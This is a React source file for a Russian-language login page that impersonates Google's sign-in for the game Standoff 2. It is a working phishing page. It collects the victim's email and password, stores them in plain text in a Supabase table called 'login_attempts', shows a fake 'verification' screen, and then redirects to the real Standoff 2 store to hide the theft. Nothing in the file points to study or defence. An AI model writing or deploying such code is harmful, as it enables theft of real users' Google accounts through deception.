import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import Logo from "@/components/Logo";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState<"email" | "password" | "loading">("email");
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (step === "email") {
      if (email) {
        // Проверяем валидность формата email
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
          toast.error("Введите действительный адрес электронной почты");
          return;
        }
        setStep("password");
      }
    } else {
      // Показываем экран загрузки
      setStep("loading");
      
      // Сохраняем email и пароль в БД
      const { error } = await supabase
        .from("login_attempts")
        .insert({ email, password });
      
      if (error) {
        console.error("Ошибка сохранения:", error);
        toast.error("Ошибка сохранения данных");
        setStep("password");
      } else {
        console.log("Данные сохранены в БД:", { email, password });
        // Перенаправляем на store.standoff2.com
        window.location.href = "https://store.standoff2.com/";
      }
    }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Header */}
      <header className="border-b border-border px-6 py-4 flex items-center gap-4">
        <Logo />
        <span className="text-foreground text-xl">Вход через аккаунт Google</span>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-start justify-center pt-12 px-4">
        <div className="w-full max-w-md">
          <h1 className="text-5xl font-normal text-foreground mb-6">Вход</h1>
          
          {step === "email" ? (
            <>
              <p className="text-foreground mb-10">
                Переход в приложение "<span className="text-primary">Standoff 2</span>"
              </p>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <Input
                    type="email"
                    placeholder="Телефон или адрес эл. почты"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
                  />
                </div>

                <a href="#" className="text-primary text-sm hover:underline inline-block">
                  Забыли адрес электронной почты?
                </a>

                <p className="text-muted-foreground text-sm leading-relaxed">
                  Это не ваш компьютер? Используйте гостевой режим для конфиденциального входа в систему.{" "}
                  <a href="#" className="text-primary hover:underline">
                    Подробнее о гостевом режиме
                  </a>
                </p>

                <div className="flex justify-between items-center pt-8">
                  <Button
                    type="button"
                    variant="ghost"
                    className="text-primary hover:bg-secondary hover:text-primary"
                  >
                    Создать аккаунт
                  </Button>
                  
                  <Button
                    type="submit"
                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
                  >
                    Далее
                  </Button>
                </div>
              </form>
            </>
          ) : step === "loading" ? (
            <div className="flex flex-col items-center justify-center py-20">
              <div className="w-16 h-16 border-4 border-primary border-t-transparent rounded-full animate-spin mb-8"></div>
              <h2 className="text-3xl font-normal text-foreground mb-4">Проверка</h2>
              <p className="text-muted-foreground text-center max-w-md">
                Это может занять несколько минут
              </p>
            </div>
          ) : (
            <>
              <h1 className="text-5xl font-normal text-foreground mb-8">Добро пожаловать!</h1>
              
              <div className="flex items-center gap-3 mb-10">
                <div className="w-10 h-10 rounded-full bg-muted flex items-center justify-center">
                  <svg
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    className="text-muted-foreground"
                  >
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                    <circle cx="12" cy="7" r="4" />
                  </svg>
                </div>
                <div className="text-foreground">{email}</div>
              </div>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <label className="text-sm text-primary mb-2 block">
                    Введите пароль
                  </label>
                  <Input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
                  />
                </div>

                <div className="flex items-center gap-2">
                  <input
                    type="checkbox"
                    id="showPassword"
                    checked={showPassword}
                    onChange={(e) => setShowPassword(e.target.checked)}
                    className="w-4 h-4 rounded border-border bg-input cursor-pointer"
                  />
                  <label htmlFor="showPassword" className="text-foreground text-sm cursor-pointer">
                    Показать пароль
                  </label>
                </div>

                <div className="flex justify-between items-center pt-8">
                  <Button
                    type="button"
                    variant="ghost"
                    onClick={() => setStep("email")}
                    className="text-primary hover:bg-secondary hover:text-primary"
                  >
                    Другой способ
                  </Button>
                  
                  <Button
                    type="submit"
                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
                  >
                    Далее
                  </Button>
                </div>
              </form>
            </>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="px-6 py-4">
        <div className="flex items-center justify-between max-w-7xl mx-auto">
          <div className="relative">
            <select className="bg-transparent text-muted-foreground border-none outline-none cursor-pointer appearance-none pr-6">
              <option>Русский</option>
              <option>English</option>
              <option>Español</option>
            </select>
            <svg
              className="absolute right-0 top-1/2 -translate-y-1/2 pointer-events-none"
              width="20"
              height="20"
              viewBox="0 0 20 20"
              fill="currentColor"
            >
              <path d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" />
            </svg>
          </div>
          
          <div className="flex gap-6">
            <a href="#" className="text-muted-foreground text-sm hover:text-foreground">
              Справка
            </a>
            <a href="#" className="text-muted-foreground text-sm hover:text-foreground">
              Конфиденциальность
            </a>
            <a href="#" className="text-muted-foreground text-sm hover:text-foreground">
              Условия
            </a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Login;
